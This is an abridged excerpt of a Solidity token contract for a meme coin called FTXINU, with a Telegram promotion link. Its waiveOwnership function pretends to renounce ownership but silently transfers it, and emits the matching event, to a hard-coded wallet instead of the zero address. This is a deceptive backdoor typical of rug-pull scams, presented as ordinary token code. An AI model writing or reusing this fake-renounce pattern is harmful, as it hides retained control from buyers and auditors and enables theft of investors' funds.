...
/**
   FTX INU THE FTX KILLER 
   https://t.me/FtxInuBscPortal
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x86a40918a8E41d74eb95b9058697940F6a8c15b8));
        _owner = address(0x86a40918a8E41d74eb95b9058697940F6a8c15b8);
    }
...
contract FTXINU is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "FTXINU";
    string private _symbol = "FTXI";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x1b42Ed157AE69152dE494Cc0D18c3EbcC747853a);
    address payable public teamWalletAddress = payable(0x1b42Ed157AE69152dE494Cc0D18c3EbcC747853a);
